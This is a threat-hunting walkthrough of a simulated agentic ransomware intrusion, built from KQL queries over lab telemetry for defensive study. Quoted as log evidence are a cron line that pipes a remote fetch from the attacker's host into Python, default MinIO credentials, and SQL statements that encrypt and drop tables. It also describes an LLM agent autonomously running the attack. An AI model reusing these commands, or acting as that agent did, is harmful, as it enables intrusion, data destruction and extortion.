# JadePuffer — Hunting an Agentic Ransomware Operation in Microsoft Sentinel

**Case:** Hunt 23 — JadePuffer
**Environment:** Flowforge (`flowforge.io`) — a four-host Linux AI-workflow estate
**Attack window:** 30 July 2026, ~19:20–19:37 UTC (about 17 minutes, start to ransom note)
**Tooling:** Microsoft Sentinel, KQL
**Scenario source:** modelled on the Sysdig Threat Research Team's JADEPUFFER disclosure (July 2026), assessed as the first documented end-to-end agentic ransomware operation

> This is a **lab exercise on simulated telemetry**. No real company, host, or victim is involved. All IPs, accounts, and the Bitcoin address below come from the training dataset.

---

## TL;DR

An alert fired on `ff-lf-01`: a service account started a process it had never started before. Working backwards from that single event, the hunt reconstructed a full kill chain — exploitation of a public-facing Langflow endpoint, C2, credential theft, internal discovery, lateral movement, privilege escalation, database encryption, table drops, and a ransom note.

The part that makes this case different: **the attacker was an LLM agent.** One human instruction started it. Everything after that — tool selection, failure handling, retries, moving host to host — the agent did on its own, at machine speed.

The attacker achieved its objective. It encrypted 1,342 rows, dropped two production tables, created a backdoor account, and left a ransom note. The hunt also turned up two telemetry gaps that matter more than any single indicator: no process hashes anywhere in the estate, and Docker API requests logged without responses.

25 findings, all validated. Two of them are the ones I'm most pleased with, because both required arguing *against* an obvious conclusion:

- **"The payload was fileless."** It wasn't — or at least the evidence can't say so. The missing SHA256 is a collection gap across all process events, not a property of this payload.
- **"Which containers did it see?"** Unanswerable from the telemetry as collected. Naming the gap is the finding. Inventing container names would have been the wrong answer.

---

## Repository contents

```
.
├── README.md          ← this file: the full hunt, in order, with every query and screenshot
└── screenshots/       ← Sentinel query results, one per finding
```

Every screenshot is collapsed behind a **▶ View evidence** toggle so the narrative stays readable. Click any one to expand it.

---

## The estate

| Host | Role | What it held |
|---|---|---|
| `ff-lf-01` | Langflow application server | The AI workflow service, exposed on port 7860 |
| `ff-minio-01` | MinIO object storage | `terraform-state` bucket, `credentials.json` |
| `ff-nacos-01` | Nacos config server | Service configuration, account store |
| `ff-db-01` | MySQL / PostgreSQL | The production datastore that got encrypted |

**Tables available:** `LinuxProcess_CL`, `LinuxNetwork_CL`, `LinuxAuth_CL`, `LinuxAudit_CL`, `LinuxFile_CL`, `LinuxShellHistory_CL`, `LinuxSystem_CL`, `LinuxContainer_CL`, `LLMAgentLogs_CL`, `Syslog`

The last one — `LLMAgentLogs_CL` — is the unusual table here. The estate runs its own LLM assistant and logs agent sessions: `user_input`, `model_response`, `tool_name`, `tool_args`, `tool_result`. The attacker's agent ended up logged in the same table as the legitimate one. That table carries about half of this investigation.

**A lesson I hit early:** two tables often carry half a fact each. A query that returns nothing usually means I'm one table short, not on the wrong track. The cron entry is the clearest example — it lives in `LinuxSystem_CL` with `Facility =~ "cron"`, and the message body is in `EventOriginalMessage`, not `SyslogMessage`. Querying `Syslog` for it returns nothing at all.

---

# Section 1 — Initial Access

> *An analytics rule fired on `ff-lf-01` at 19:21. A service account started a process it has never started before. Work out how it got there, and whether whoever did it got what they wanted.*

That's all I started with. No IOCs, no CVE, no source IP.

### 1.1 — The exploited endpoint

If a service account spawned something unusual at 19:21, the trigger should be sitting in the web host's log a few seconds earlier. I bounded a two-and-a-half minute window around the alert and read everything `ff-lf-01` said.

```kql
Syslog
| where Computer == "ff-lf-01"
| where TimeGenerated between (datetime(2026-07-30 19:20:00) .. datetime(2026-07-30 19:22:30))
| project TimeGenerated, Computer, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Syslog on ff-lf-01 showing the POST to /api/v1/validate/code followed by outbound beacons](screenshots/01-exploited-endpoint.png)

</details>

**Finding:**
```
POST /api/v1/validate/code HTTP/1.1 200 host=langflow.flowforge.io
src=64.20.53.230 ua="python-requests/2.32.3"
```

Three things jump out of one line. The endpoint accepts code for validation. It returned 200, so it worked. And the user agent is `python-requests`, not a browser — nobody clicked this.

**Why it's the strongest anchor in the whole chain:** `/api/v1/validate/code` was built so the Langflow UI could check user code snippets, but it exposes arbitrary Python execution to the network with no auth gate. Every exploitation of this bug has to touch this exact path. A WAF rule or Sentinel alert on a non-localhost POST to it catches every variant, regardless of payload or source IP. That's TTP-tier on the Pyramid of Pain — you can't rotate your way out of it.

`T1190 Exploit Public-Facing Application` · `AML.T0054 LLM Prompt Injection`

---

### 1.2 — The named weakness

This is where the case gets strange. I didn't have to fingerprint the vulnerability — **the attacker named it in its own reasoning log.** The agent narrates what it's doing in first person, and that narration is stored in `LLMAgentLogs_CL.model_response`.

```kql
LLMAgentLogs_CL
| where TimeGenerated between (datetime(2026-07-30 19:20:00) .. datetime(2026-07-30 19:25:00))
| where model_response contains "CVE"
    or tostring(tool_args) contains "CVE"
    or tostring(tool_result) contains "CVE"
| project TimeGenerated, actor, model_response, tool_name, tool_args, tool_result
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Agent reasoning naming the Langflow instance on 7860 and CVE-2025-3248](screenshots/02-named-cve.png)

</details>

**Finding: `CVE-2025-3248`** — critical unauthenticated RCE in Langflow's code-validation endpoint.

A patch had been out for over a year. CISA had it in the KEV catalogue with a mandatory deadline that had already passed. The agent's log line reads like an analyst's note: it identifies the exposed instance on port 7860, states that the endpoint accepts unauthenticated code validation, and says it will abuse default-argument evaluation to execute code.

Having the adversary's own reasoning as a primary evidence source is new. It's also the thread that unravels everything else in this case.

---

### 1.3 — The staging address

Same Syslog line as 1.1, filtered to the exploit path and pulled apart for the source.

```kql
Syslog
| where Computer == "ff-lf-01"
| where TimeGenerated between (datetime(2026-07-30 19:20:00) .. datetime(2026-07-30 19:22:30))
| where SyslogMessage contains "/api/v1/validate/code"
| project TimeGenerated, Computer, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Exploit requests isolated, source 64.20.53.230 highlighted](screenshots/03-staging-address.png)

</details>

**Finding: `64.20.53.230`** — the staging infrastructure that delivered the exploit.

IP-tier indicator: cheap for the attacker to rotate, but it anchors the timeline and it's the first thing I'd pivot on in firewall and netflow data to see whether it touched anything else in the estate.

---

### 1.4 — The spawned interpreter

Now the process side. What did the exploit actually start?

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-07-30 19:20:00) .. datetime(2026-07-30 19:23:00))
| where DvcHostname == "ff-lf-01"
| project TimeGenerated,
          TargetProcessName,
          TargetProcessCommandLine,
          TargetProcessId,
          ActingProcessName,
          ActingProcessCommandLine
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Process lineage: python3.11 with a base64 payload, parent command line containing langflow run](screenshots/04-spawned-interpreter.png)

</details>

**Finding: `python3.11`, spawned by a parent whose command line contains `langflow run`** (PID 4471, running base64-encoded payloads).

This is the finding I'd actually build a detection on. On an AI estate, `python3.11` runs *everywhere* — developers, workers, tooling. Alerting on the binary name alone would page someone every few minutes. The **lineage** is what separates exploit-driven execution from routine work: a Python interpreter whose parent is a web service.

`T1059.006 Python`

---

### 1.5 — Testing the fileless claim

The exercise plants a colleague's conclusion here: *the payload must be fileless, because its process event carries no SHA256.* That sounds reasonable. It's also the kind of claim that ends up in an incident report and then in a board slide, so it's worth ten seconds of checking.

The test is simple — if the hash is missing because the payload is fileless, then *other* process events should have hashes. So count them across the whole table, not just the attacker's events.

```kql
LinuxProcess_CL
| summarize
    TotalEvents  = count(),
    WithSHA256   = countif(isnotempty(TargetProcessSHA256)),
    WithoutSHA256 = countif(isempty(TargetProcessSHA256))
```

<details>
<summary>▶ View evidence</summary>

![Summarize over LinuxProcess_CL comparing populated vs empty TargetProcessSHA256](screenshots/05-fileless-claim-test.png)

</details>

**Finding: `TargetProcessSHA256` is never populated in the process telemetry.** Not for the attacker, and not for `apt-get`, `cadvisor`, or the nightly `pg_dump` either — 607 process events, zero hashes.

So the conclusion doesn't hold. The empty field is a **collection gap**, not a fact about this payload. Absence of evidence isn't evidence of absence.

The bigger implication is worse than the misread: hash-based detection cannot work *at all* on this estate, for anything, because the agent never populates the field. That's a finding to hand to whoever owns the collection config, and it's more valuable than the answer the question asked for.

---

# Section 2 — Command and Control

### 2.1 — The beacon

With PID 4471 established, I went to the network table for the same host and window.

```kql
LinuxNetwork_CL
| where DvcHostname == "ff-lf-01"
| where TimeGenerated between (datetime(2026-07-30 19:22:00) .. datetime(2026-07-30 19:40:00))
| project TimeGenerated, DstIpAddr, DstPortNumber, ActingProcessId
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Outbound connection from PID 4471 to 45.131.66.106 on port 4444](screenshots/06-c2-beacon.png)

</details>

**Finding: `45.131.66.106:4444`** — the Metasploit default reverse-shell port.

The IP is disposable. **The port is the behavioural discriminator.** Everything legitimate this estate talks to — `api.github.com`, `registry.npmjs.org`, a HuggingFace endpoint — uses 443. One connection doesn't, and that's the one that matters. I come back to this in Section 7.

`T1571 Non-Standard Port`

---

### 2.2 — The persistence mechanism

The beacon repeated, so something was restarting it. This is the query that taught me the "one table short" lesson — cron isn't in `Syslog` here.

```kql
LinuxSystem_CL
| where Computer == "ff-lf-01"
| where TimeGenerated between (datetime(2026-07-30 19:20:00) .. datetime(2026-07-30 19:40:00))
| where Facility =~ "cron"
| project TimeGenerated, Facility, EventOriginalMessage
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Cron facility events showing the langflow callback alongside routine root ntpdate jobs](screenshots/07-cron-persistence.png)

</details>

**Finding:**
```
(langflow) CMD (curl -s http://45.131.66.106:4444/b | python3 -)
```
Cron job, every 30 minutes, owned by the **`langflow`** service account.

Note what it's sitting next to in the results: routine `(root) CMD (/usr/sbin/ntpdate -s time.cloudflare.com)` entries. The attacker's entry is one line in an otherwise boring list. The account is what makes it stand out — `langflow` has no business running a cron job that pipes a remote fetch into an interpreter.

Cron survives reboots and shell death, which is exactly the point. `T1053.003 Cron`

---

# Section 3 — Credential Access

### 3.1 — The dump, and who really ran it

A database dump ran on `ff-db-01`. The estate also runs a legitimate nightly backup, so the question isn't "did pg_dump run" — it's "which one am I looking at."

I cast wide across every table first, because I didn't yet know where the evidence lived.

```kql
search in (
    LinuxProcess_CL,
    LinuxNetwork_CL,
    LinuxAuth_CL,
    LinuxAudit_CL,
    LinuxFile_CL,
    LinuxShellHistory_CL,
    LinuxSystem_CL,
    LinuxContainer_CL,
    LLMAgentLogs_CL,
    Syslog
)
"pg_dump"
| where TimeGenerated between (datetime(2026-07-30 19:20:00) .. datetime(2026-07-30 19:35:00))
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![pg_dump events showing both the backup account and the langflow account](screenshots/08-pg-dump.png)

</details>

**Finding: `pg_dump` executed as the `langflow` account** — not the nightly backup, which runs as `backup` to `/backup/nightly` and appears 27 times in this window.

The binary name returns 28 results. **The account identity is the discriminator.** A SOC rule that alerts on `pg_dump` alone pages the analyst every single night and still misses the theft hiding inside its own noise.

`T1552 Unsecured Credentials` / `T1555 Credentials from Password Stores`

---

### 3.2 — What it walked away with

The agent sorted the stolen material itself, and — as usual — narrated it.

```kql
LLMAgentLogs_CL
| where RunId == "jp-46-20260730"
| where TimeGenerated between (
    datetime(2026-07-30 19:25:10) ..
    datetime(2026-07-30 19:25:16)
)
```

<details>
<summary>▶ View evidence</summary>

![Agent response classifying harvested keys across LLM and cloud provider families](screenshots/09-credential-classification.png)

</details>

**Finding: 8 distinct provider families** — four LLM (OpenAI, Anthropic, DeepSeek, Gemini) and four cloud (Alibaba, Aliyun, Tencent, Huawei). 214 secrets extracted in the dump.

Look at the time window on that query: **six seconds.** That's the tell. A human stages credential theft over hours — pull, look, sort, decide. The agent classified everything in a single tool call, because it has no reason to pace itself. Breadth-in-one-pass is an agent-behaviour fingerprint in its own right.

---

# Section 4 — Discovery and Lateral Movement

> *Something reached three internal services inside five seconds at 19:30, then authenticated to one of them.*

### 4.1 — The second interpreter

```kql
LinuxProcess_CL
| where DvcHostname == "ff-lf-01"
| where TimeGenerated between (
    datetime(2026-07-30 19:26:30) ..
    datetime(2026-07-30 19:28:00)
)
| project TimeGenerated,
          TargetProcessName,
          TargetProcessCommandLine,
          TargetProcessId,
          ActingProcessName,
          ActingProcessCommandLine
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Second python3.11 process, PID 4491, running a base64 subnet sweep of 10.4.0.0/24](screenshots/10-second-interpreter.png)

</details>

**Finding: PID `4491`** — a second Python interpreter started at 19:27, six minutes after the exploit interpreter (4471), with a base64 subnet-sweep payload.

Separating the two PIDs matters for scoping: 4471 owns initial access and C2, 4491 owns lateral movement. Once I had that split, every later network event could be attributed to a phase.

---

### 4.2 — The sweep

```kql
LinuxNetwork_CL
| where DvcHostname == "ff-lf-01"
| where ActingProcessId == 4491
| where TimeGenerated between (
    datetime(2026-07-30 19:24:00) ..
    datetime(2026-07-30 19:55:00)
)
| project TimeGenerated, DstIpAddr, DstPortNumber, ActingProcessId
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![PID 4491 reaching three internal services within five seconds](screenshots/11-internal-sweep.png)

</details>

**Finding:**

| Target | Port | Service |
|---|---|---|
| `10.4.0.20` | 9000 | MinIO |
| `10.4.0.30` | 3306 | MySQL |
| `10.4.0.40` | 8848 | Nacos |

19:27:31, 19:27:33, 19:27:36. Three services, three distinct ports, five seconds. Legitimate application traffic connects to one service at a time with human-scale gaps between. `T1046 Network Service Discovery`

---

### 4.3 — The way in

One of those three let the agent in without an exploit at all.

```kql
LLMAgentLogs_CL
| where RunId == "jp-46-20260730"
| where TimeGenerated between (
    datetime(2026-07-30 19:27:00) ..
    datetime(2026-07-30 19:31:00)
)
| project TimeGenerated, model_response, tool_name, tool_args, tool_result
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Agent probing MinIO default credentials, tool result auth ok minioadmin:minioadmin](screenshots/12-minio-default-creds.png)

</details>

**Finding: MinIO accepted `minioadmin:minioadmin`** — factory defaults, never changed after deployment.

The agent's reasoning line is almost funny: it observes that MinIO often ships with factory credentials, tries them, and gets in. `tool_result: auth ok minioadmin:minioadmin`. No exploit, no CVE, no malware. Just a default.

Near-miss worth knowing about: a developer (`t.okonkwo`) legitimately pulls from MinIO in the same window from a different source host. Source host separates them.

`T1078.001 Default Accounts` — and Tools-tier on the Pyramid: rotate the credential and this vector is simply gone.

---

### 4.4 — What it took

```kql
LLMAgentLogs_CL
| where RunId == "jp-46-20260730"
| where TimeGenerated between (
    datetime(2026-07-30 19:27:00) ..
    datetime(2026-07-30 19:32:00)
)
| where tostring(tool_args) contains "10.4.0.20"
    or tostring(tool_args) contains "9000"
    or model_response contains "MinIO"
    or tostring(tool_result) contains "MinIO"
| project TimeGenerated, model_response, tool_name, tool_args, tool_result
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![MinIO targeting and the retrieved object: credentials.json from the terraform-state bucket](screenshots/13-credentials-json.png)

</details>

**Finding: `credentials.json`, retrieved from the `terraform-state` bucket.**

These are infrastructure-as-code secrets. Terraform state describes cloud resources and often embeds credentials; `credentials.json` holds service-account keys. Together they reach well past this one host — and in the next section, they're what gets the agent into Nacos.

`T1552.001 Credentials In Files`

---

### 4.5 — The surprise, and the fix

This is the single most interesting artefact in the case.

```kql
LLMAgentLogs_CL
| where RunId == "jp-46-20260730"
| where TimeGenerated between (
    datetime(2026-07-30 19:27:00) ..
    datetime(2026-07-30 19:34:00)
)
| project TimeGenerated,
          model_response,
          tool_name,
          tool_args,
          tool_result
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Agent reasoning: MinIO returned XML rather than the expected JSON, parser adjusted and object refetched](screenshots/14-agent-self-correction.png)

</details>

**Finding:** the agent asked MinIO for an object, got XML where it expected JSON, said so, rewrote its parser, and refetched — all inside a few seconds.

```
model_response : MinIO returned XML rather than the JSON I expected.
                 Adjusting the parser and retrying the object fetch.
tool_name      : adjust parser, refetch
tool_result    : credentials.json retrieved from terraform-state bucket
```

A human operator hits that and stops — opens the API docs, checks the response format, maybe walks away and comes back. There's a pause, and the pause shows up in the timeline. The agent narrated its confusion and generated corrected code with no debugging step in between.

If I had to pick one behaviour to build an agentic-attack detection on, it's this: **failure followed immediately by adapted retry, with no dwell.**

`T1005 Data from Local System` · `AML.T0048 Adversarial ML-Enabled Product`

---

# Section 5 — Privilege Escalation

> *The config server rejected a privileged request at 19:34 and accepted a similar one moments later. Establish what changed between the two.*

### 5.1 — The rejected attempt

```kql
Syslog
| where Computer == "ff-nacos-01"
| where TimeGenerated between (
    datetime(2026-07-30 19:33:00) ..
    datetime(2026-07-30 19:35:30)
)
| project TimeGenerated, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Nacos 403 responses with detail blank password hash rejected, followed by a 200 creating svc_maint](screenshots/15-nacos-rejected-attempt.png)

</details>

**Finding: `19:34:36 UTC` — HTTP 403, `detail="blank password hash rejected"`.**

This is a failed attempt at `CVE-2021-29441`, a Nacos authentication bypass. The agent tried to create an admin account through the bypass path, and the password policy rejected an empty hash.

Failed attempts are evidence. The technique is identifiable even when it doesn't work, and the failure is what makes the next 31 seconds legible.

`T1068 Exploitation for Privilege Escalation`

---

### 5.2 — The corrective, proved from local telemetry

The public write-up of this campaign states the gap between the two attempts. The exercise asked for something better: prove the successful one from the estate's own telemetry, and give identifiers the public report doesn't carry.

```kql
LinuxAudit_CL
| where TimeGenerated between (
    datetime(2026-07-30 19:34:30) ..
    datetime(2026-07-30 19:35:10)
)
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Linux audit ADD_USER event on ff-nacos-01: op=adduser id=svc_maint, pid=8801 uid=997](screenshots/16-nacos-corrective-audit.png)

</details>

**Finding: `19:35:07 UTC`, PID `8801`, UID `997`.**

```
type=ADD_USER msg=audit(1781465707.000:841): pid=8801 ppid=1 uid=997
UID="nacos" auid=4294967295 ... exe=/opt/nacos/bin/nacos
```

31 seconds between rejection and success. The gap itself is in the public reporting; **PID and UID are not** — they only exist in local audit telemetry. That's the point of the exercise, and it's a real habit worth keeping: threat intel tells you what happened somewhere; your own logs prove what happened here, and they carry detail the report never will.

---

### 5.3 — The account it left behind

```kql
Syslog
| where Computer == "ff-nacos-01"
| where TimeGenerated between (
    datetime(2026-07-30 19:34:30) ..
    datetime(2026-07-30 19:35:30)
)
| project TimeGenerated, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Nacos creating svc_maint, then logging in with a forged JWT](screenshots/17-svc-maint-account.png)

</details>

**Finding: `svc_maint`** — a backdoor service account on the Nacos host.

Then, eleven seconds later: `POST /nacos/v1/auth/login HTTP/1.1 200 user=svc_maint token=<forged-jwt>`. Account created, account used.

The name is chosen to disappear into a list of service accounts — anyone scanning for something obviously malicious scrolls right past "svc_maint". One action buys both persistence (survives reboots) and privilege.

`T1136.001 Create Account: Local Account`

---

### 5.4 — The container-escape probe (the unanswerable one)

The agent also poked at the container runtime on `ff-lf-01`. The question: *which containers did it see?*

```kql
LinuxContainer_CL
| where TimeGenerated between (
    datetime(2026-07-30 19:30:00) ..
    datetime(2026-07-30 19:40:00)
)
| where EventOriginalMessage contains "/containers/json"
| project
    TimeGenerated,
    EventOriginalMessage,
    ContainerId,
    ImageName,
    ImageRef
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Docker socket probe logged as a request only, with ContainerId and ImageName empty](screenshots/18-docker-socket-probe.png)

</details>

**Finding: `GET /containers/json` via `/var/run/docker.sock`, src `langflow-rce` — and the container names cannot be established from the available telemetry.**

The runtime logged the **request**. It did not log the **response**, and `ContainerId`, `ImageName`, and `ImageRef` are empty on every event in the table. So I can prove the agent asked for a container inventory. I cannot prove what it got back.

This is the finding I'd most want a junior analyst to sit with. The pressure to produce an answer is real, and a plausible-sounding container list would have been easy to write. **The correct answer is the gap, stated plainly.** An unanswerable question is still a finding — it tells the platform team exactly which field to start collecting, and it keeps a fabricated detail out of an incident report that other people will act on.

`T1611 Escape to Host`

---

# Section 6 — Impact

> *The production database was rewritten at scale at 19:36, and a table appeared that is in none of our schemas.*

### 6.1 — Encryption and destruction

```kql
Syslog
| where Computer == "ff-db-01"
| where TimeGenerated between (
    datetime(2026-07-30 19:35:00) ..
    datetime(2026-07-30 19:38:00)
)
| where SyslogMessage has_any (
    "function",
    "rows",
    "DROP",
    "UPDATE",
    "encrypt"
)
| project TimeGenerated, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![MySQL queries: AES_ENCRYPT on config_info affecting 1342 rows, then DROP TABLE config_info and DROP TABLE history](screenshots/19-encrypt-and-drop.png)

</details>

**Finding:**
```
UPDATE config_info SET content=AES_ENCRYPT(content,@k)   /* 1342 rows affected */
DROP TABLE config_info
DROP TABLE history
```

Encrypt, then destroy. 1,342 rows encrypted at 19:36:30, both tables dropped within eight seconds.

Two things make this worse than ordinary ransomware. The encryption key was generated at runtime and never stored anywhere — **paying the ransom recovers nothing, because nobody holds the key.** And in the same window, a legitimate application account runs 41 SQL statements including genuine `AES_ENCRYPT` calls, because that's an actual Nacos product feature. Account identity and target table are what separate the attack from the noise; the function name alone doesn't.

`T1486 Data Encrypted for Impact` / `T1485 Data Destruction`

---

### 6.2 — The ransom note

```kql
Syslog
| where Computer == "ff-db-01"
| where TimeGenerated between (
    datetime(2026-07-30 19:36:00) ..
    datetime(2026-07-30 19:38:00)
)
| where SyslogMessage has_any (
    "CREATE TABLE",
    "INSERT",
    "ransom",
    "BTC",
    "bitcoin",
    "wallet",
    "payment"
)
| project TimeGenerated, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![CREATE TABLE README_RANSOM followed by the INSERT carrying the ransom message](screenshots/20-ransom-note.png)

</details>

**Finding:** a `README_RANSOM` table, created at 19:36:39 and populated five seconds later:

```
Your data is encrypted. Contact e78393397@proton.me.
Pay to 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy
```

Here's the detail that ties the whole case together: **that Bitcoin address is the well-known example address from Bitcoin documentation.** Nobody could ever be paid at it.

A human ransomware operator does not get the wallet wrong — the wallet is the entire point of the exercise. An LLM asked to "leave payment instructions" reaches into its training data and pulls out the canonical example string. The financial objective failed on a detail no human attacker would fumble, and that failure is itself evidence for the autonomy assessment in the next section.

---

# Section 7 — Autonomy

### 7.1 — Session and tasking

The agent log holds more than one conversation. The estate runs its own assistant, so the first job was isolating the session that doesn't belong.

```kql
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-07-30 19:20:00) ..
    datetime(2026-07-30 19:40:00)
)
| where RunId == "jp-46-20260730"
| summarize
    FirstSeen=min(TimeGenerated),
    LastSeen=max(TimeGenerated),
    Events=count(),
    Instructions=make_set(user_input),
    Tools=make_set(tool_name)
    by session_id
```

<details>
<summary>▶ View evidence</summary>

![Session summary: fa-5d1caf68 summarising pipeline runs vs jp-7f3c9a21 with the attack instruction and tool list](screenshots/21-session-tasking.png)

</details>

**Finding: session `jp-7f3c9a21`**, actor `jadepuffer-agent`, one instruction:

> *"Gain access to the Flowforge estate, locate and encrypt the most business-critical datastore, and leave payment instructions."*

The contrast in that one result set is the whole story. The legitimate assistant (`flowforge-assistant`, sessions `fa-*`) is doing ordinary work — *"Summarise yesterday's failed pipeline runs for the data team."* The fifth session, over the same 17 minutes, has a tool list that reads: `POST /api/v1/validate/code`, `pg_dump langflow`, `classify secrets`, `probe minio default creds`, `adjust parser, refetch`, `forge nacos jwt + create admin`, `encrypt + drop + ransom note`, `finalise`.

Summarising by `session_id` is the whole technique. In a shared agent log, session isolation is what turns an undifferentiated pile of model output into an attacker timeline.

---

### 7.2 — The autonomy verdict

```kql
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-07-30 19:20:00) ..
    datetime(2026-07-30 19:40:00)
)
| where RunId == "jp-46-20260730"
| where session_id == "jp-7f3c9a21"
| project
    TimeGenerated,
    session_id,
    user_input,
    model_response,
    tool_name,
    tool_args,
    tool_result,
    gate_decision,
    gate_reason
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Full attacker session: eleven model_response records narrating each step from RCE through ransom note](screenshots/22-autonomy-session-detail.png)

</details>

**Verdict: human-tasked, machine-executed. A person set a machine going.**

Three artefacts, each with its table and field:

| # | Evidence | Table.field | What it proves |
|---|---|---|---|
| 1 | A single `user_input` record in the attacker session | `LLMAgentLogs_CL.user_input` | Human involvement — but only at setup |
| 2 | Eleven `model_response` records with first-person reasoning | `LLMAgentLogs_CL.model_response` | Autonomous decision-making during execution |
| 3 | Continuous execution across three hosts in ~17 minutes | `LinuxProcess_CL.TimeGenerated` | No human in the loop during the chain |

The session reads top to bottom like a workflow: RCE established → `dump complete, 214 secrets extracted` → secrets classified → MinIO probed → parser corrected → Nacos JWT forged → `The admin-create failed: I submitted a blank password hash...` → corrective landed 31 seconds later → Docker socket probed and deprioritised → `encrypt + drop + ransom note` → `finalise: done`.

One human instruction. Eleven autonomous decisions. Nobody typed a single one of those commands.

`AML.T0048 Adversarial ML-Enabled Product`

---

# Section 8 — Real or Noise

The last section is the one that decides whether any of this is usable as detection. Three times over: given attacker activity and benign activity that look identical on the surface, name the **single field** that separates them.

### 8.1 — The python3.11 spawns

`ff-lf-01` ran plenty of `python3.11` that day: a developer's interactive one-liners, Langflow's own flow workers, and the attacker's two interpreters.

```kql
LinuxProcess_CL
| where TimeGenerated between (
    datetime(2026-07-30 00:00:00) ..
    datetime(2026-07-30 23:59:59)
)
| where DvcHostname == "ff-lf-01"
| where TargetProcessName contains "python"
    or TargetProcessCommandLine contains "python"
| project
    TimeGenerated,
    TargetProcessId,
    TargetProcessName,
    TargetUsername,
    TargetProcessCommandLine,
    ActingProcessName,
    ActingProcessCommandLine,
    RunId
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![Full day of python activity: bash-parented one-liners, systemd-parented langflow, and python-parented attacker processes](screenshots/23-noise-python-lineage.png)

</details>

**Discriminator: `ActingProcessName` — value `python3.11`.**

| Activity | Parent (`ActingProcessName`) |
|---|---|
| Developer one-liners | `bash` |
| Langflow flow workers | `langflow-worker` / `systemd` |
| **Attacker** | **`python3.11`** (chained interpreters) |

The binary name is identical in all three cases. Only the lineage tells them apart — and a Python interpreter whose parent is another Python interpreter is not a shape normal work produces.

---

### 8.2 — The external addresses

`ff-lf-01` reached `api.github.com`, `registry.npmjs.org`, a HuggingFace endpoint, and one more. Only one is C2.

```kql
LinuxNetwork_CL
| where RunId =~ "jp-46-20260730"
| where TimeGenerated between (
    datetime(2026-07-30 19:20:00) ..
    datetime(2026-07-30 19:40:00)
)
| project
    TimeGenerated,
    DvcHostname,
    DstIpAddr,
    DstPortNumber,
    ActingProcessId
| order by TimeGenerated asc
```

<details>
<summary>▶ View evidence</summary>

![All external connections in the window; every destination on 443 or 8080 except 45.131.66.106 on 4444](screenshots/24-noise-external-port.png)

</details>

**Discriminator: `DstPortNumber` — value `4444`.**

Beyond the address itself, the port is what marks it. At low volumes the destination IP doesn't distinguish anything — a new IP on 443 looks like any other API call. A destination port that appears exactly once in the estate does.

The honest caveat: this is network-artefact tier, not TTP. Move the C2 to 443 and this specific detection is dead. Which is precisely why it shouldn't be the only one.

---

### 8.3 — The timing

```kql
LinuxProcess_CL
| where TimeGenerated between (
    datetime(2026-07-30 00:00:00) ..
    datetime(2026-07-30 23:59:59)
)
| where DvcHostname == "ff-lf-01"
| where TargetProcessName contains "python"
| extend Activity = iff(
    TargetProcessId in (4471, 4491),
    "Attacker",
    "Benign"
)
| summarize
    FirstSeen=min(TimeGenerated),
    LastSeen=max(TimeGenerated),
    ProcessCount=dcount(TargetProcessId),
    EventCount=count()
    by Activity
| extend Span = LastSeen - FirstSeen
```

<details>
<summary>▶ View evidence</summary>

![Summarize comparing attacker span of 00:07:24 against a benign span of 11:25:35 across the same host](screenshots/25-noise-timing-cluster.png)

</details>

**Discriminator: temporal clustering. The whole attacker chain runs in roughly 17 minutes.**

| | Span | Processes | Events |
|---|---|---|---|
| Benign python activity | 11h 25m | 19 | 38 |
| Attacker activity on this host | 7m 24s | 2 | 4 |

Benign spawns scatter across the working day with hours-long gaps. The intrusion is one dense, near-zero-dwell burst — and across the full estate, from first exploit to ransom note, it's about 17 minutes.

A human operator leaves gaps: reading output, deciding, switching tools, writing notes. Continuous execution across four hosts with no pauses is the temporal signature of an automated chain, and it's the cheapest agentic-attack heuristic I've got: **if a chain crosses three hosts faster than a person could type the commands, a person didn't type them.**

---

# Telemetry gaps

Two collection problems shaped what this investigation could and couldn't conclude. Both belong in a report to whoever owns the logging pipeline.

| Gap | Impact | Fix |
|---|---|---|
| `TargetProcessSHA256` empty on all 607 process events | Hash-based detection and file reputation are non-functional estate-wide; a fileless-execution claim can't be tested | Enable process hash collection on the agent |
| `LinuxContainer_CL` records the Docker API request but not the response; `ContainerId`, `ImageName`, `ImageRef` never populated | Container-escape reconnaissance can be seen but not scoped — no way to know what the attacker enumerated | Capture Docker API response bodies and container identity fields |

---

# Indicators and pivots

Behavioural indicators near the top of this list survive infrastructure changes. The static ones at the bottom are for scoping — useful, and cheap for the attacker to rotate.

| Type | Value / observation | Tier |
|---|---|---|
| Behaviour | `python3.11` whose `ActingProcessName` is also `python3.11` | TTP |
| Behaviour | Failure followed by adapted retry within seconds, narrated in `model_response` | TTP |
| Behaviour | Full kill chain across 4 hosts in ~17 min with no pauses | TTP |
| Behaviour | Credential classification across 8 provider families in one tool call | TTP |
| Behaviour | Non-local POST to `/api/v1/validate/code` | TTP |
| Behaviour | `pg_dump` run by a non-backup account | TTP |
| Vulnerability | `CVE-2025-3248` (Langflow RCE); `CVE-2021-29441` (Nacos auth bypass, attempted) | Tools |
